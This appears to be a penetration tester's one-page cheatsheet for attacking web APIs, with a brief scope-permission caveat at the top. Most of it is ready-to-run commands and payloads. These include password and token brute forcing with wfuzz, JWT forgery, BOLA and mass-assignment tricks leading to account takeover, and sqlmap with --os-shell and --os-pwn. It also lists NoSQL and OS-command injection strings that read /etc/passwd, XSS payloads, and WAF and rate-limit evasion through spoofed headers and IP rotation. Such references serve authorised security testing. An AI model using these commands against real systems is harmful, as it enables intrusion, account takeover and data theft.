# Cheatsheet — Hacking APIs

One-page command & checklist reference. Live use requires verified exact-asset scope and method permission; chapter-level gates still apply.

## Recon

```bash
# Passive
amass enum -passive -d target.com | grep api          # API subdomains (legacy-, -backup)
amass intel -addr <IPs>; amass intel -d dom -whois    # expand surface
amass enum -active -brute -w API_superlist -d dom     # brute subdomains
# Dorks: inurl:"/wp-json/wp/v2/users" | intitle:"index of" api_key | site:target.com inurl:/api/
# Shodan: hostname:"t.com" "content-type: application/json" | "wp-json"

# Active
nmap -sC -sV target -oA det        # general detection
nmap -p- target                    # all 65535 ports (APIs hide everywhere)
nmap --script http-waf-detect t    # WAF check
nikto -h target:5000               # webapp vuln scan
gobuster dir -u http://t:8000 -w common_apis_160 -x 200,202,301 -b 302
kr scan http://t -w routes-large.kite              # Kiterunner endpoint discovery
kr scan http://t -w routes.kite -H 'x-access-token: JWT'   # authenticated rescan
kr brute http://t -w list.txt                      # text wordlist
kr kb replay "<result line>" -w routes.kite --proxy=http://127.0.0.1:8080
```

DevTools: Network→JS→Sources (grep `api|secret|key`); Memory snapshot (`api|v1|swagger`); Performance record (UI action → API calls); Storage (cookie tamper: `env=graphiql:disable→enable` base64).

## Endpoint analysis

- Docs: `/docs /api/docs docs. dev. developer.` + Wayback + authenticated look.
- Spec: find `swagger:"2.0"`/OpenAPI → Postman Import→Link. Vars: `{{baseURL}}`, `{{hapi_token}}`.
- Reverse engineer: Postman capture (port 5555) + FoxyProxy → use every feature → prune non-API.
- Baseline: intended-use 200s → note code/size/timing/shape; admin docs → replay unauth→low→admin.
- Early wins: extra fields (excessive data), verbose errors, status-code oracles (404 vs 401), debug pages, HTTP transit, wildcards.

## Auth attacks

```bash
# Brute force (hide known-failure code)
wfuzz -d '{"email":"a@x.com","password":"FUZZ"}' --hc 405 \
  -H 'Content-Type: application/json' -z file,rockyou.txt http://t/api/v2/auth

# Token position brute force (Sequencer found weak chars)
wfuzz -u t/api/user/dashboard --hc 404 -H "token: Ab4dt0k3nFUZZFUZ2ZFUZ3Z" \
  -z list,a-b-c-d -z list,a-b-c-d -z range,0-9
```

- Intruder: OTP=brute-forcer charset+len; spraying=cluster bomb users×pwds; base64 creds=payload-processing `Base64-encode`.
- Sequencer: ≥100 tokens manual / live-capture → char-position analysis → fuzz only weak positions.
- JWT: `jwt_tool <tok>` analyze; `-t URL -rc "Hdr: tok" -M pb` scan; `-X a` none-variants; strip sig / alg:none / RS256→HS256 w/ public key / crack HS256 secret → edit claims.

## Fuzzing

- Wide: Postman env `{{fuzzN}}` + Find&Replace `<email>/<string>` + `pm.test(status 200)` + Collection Runner (baseline: uncheck Keep Variable Values).
- Deep: Intruder every input surface; Wfuzz for speed. Verb fuzz `§GET§`→PUT…; lone-400-vs-405s = real method.
- Payloads: SecLists big-list-of-naughty-strings, fuzzdb, Wfuzz All_attack; classes: huge numbers/strings, `%00`,`0x00`,`$ne`,`$gt`,`|whoami`,`' OR 1=1-- -`,unicode,emoji.
- Anomaly: baseline diff → Burp Comparer (Sync Views) for byte-diffs.

## Authorization

- BOLA matrix (same token!): path ID; `{"id":N}`→`[N]`, `{"id":{"id":N}}`, dup keys; email/group/composite IDs; token-shaped IDs ±char.
- A-B: A makes resource → B's token requests it. Side-channel: 404-vs-401/405/length/time.
- BFLA A-B-A: B alters → A verifies. Admin docs → replay low-priv. Privilege-ladder accounts.
- Never mass-fuzz DELETE; validate on own resources.

## Mass assignment

- Registration/update bodies: add `"admin":true`, `"isadmin":true`, `"role":"admin"`, `"org":"X"`, `"mfa":false`, foreign email/account IDs.
- `arjun -u http://t/api/register -m JSON --include='{$arjun$}' --headers "Content-Type: application/json"` (`--stable` to throttle).
- Blind spray: many candidate vars in one body → API binds the real one.
- Combo: BFLA-write + `email`+`mfa:false` → password reset → ATO.

## Injection

- SQLi: `' '' ;%00 -- - " OR ""=" OR 1=1 ' OR ''='` → `sqlmap -r req -p param [--dump-all|--dump -T t -C c -D d|--os-shell|--os-pwn]`.
- NoSQLi: `{"$gt":""} {"$ne":""} {"$nin":[1]} {"$where":"sleep(1000)"}` in creds/query fields.
- OS cmd: separators `| || & && ; ' " '"` × `whoami/uname -a/cat /etc/passwd` (*nix) `ver/dir/ipconfig` (Win) — cluster bomb.
- JSON fix: position outside quotes `{"k":§"v"§}`; disable Intruder URL-encoding when needed.
- XSS/XAS: API-write fields→rendered pages; `<script>`,`<s%00cript>`,`SCRIPT>…///SCRIPT>`; try `Content-Type: text/html`.

## Evasion & rate limits

- Detect WAF: `X-CDN:*`, `X-Kong-Proxy-Latency`, `Server: Zenedge/Kestrel`, 302→CDN; `nmap --script http-waf-detect`.
- Evasion: `%00`/`0x00`/`//`/`;`/`%0a` terminators; `SeLeCT`/`<sCriPt>`; URL/HTML/b64/double-encode; Intruder rules (encode→%00 wrap); `wfuzz -z list,a,base64` / `,base64-md5-none` / `,base64@random_upper`.
- Rate limit: headers `x-rate-limit*`, 429/`Retry-After`. Lax limit → throttle `wfuzz -s` / Intruder ms. Bypass: path `%00 %20 case hyphen`, `?test=§N§`; origin headers `X-Forwarded-For/X-Host/X-Client-IP/…` w/ 127.0.0.1/private; User-Agent cycling; token rotation; IP Rotate (AWS API GW).

## GraphQL

- Paths: `/graphql /graphiql /altair /playground /console /query` ± `/v2 /test /internal /legacy`.
- `__schema` introspection → InQL (Burp ext) → rename-by-body. 200-always → diff bodies/lengths, errors in `"errors"`.
- Attacks: arg-ID BOLA (`pId`…), mutation `variables` injection (sep×cmd → `whoami`,`cat /etc/passwd`), unauth query/mutation, extra-field harvesting (`ipAddr,ownerId`).

## Report boosters

Chain narrative (disclosure→bypass→impact); quantify (e.g., `$count=true` → 99M); reproduce with test accounts; show enforcement gap, not just weird behavior.
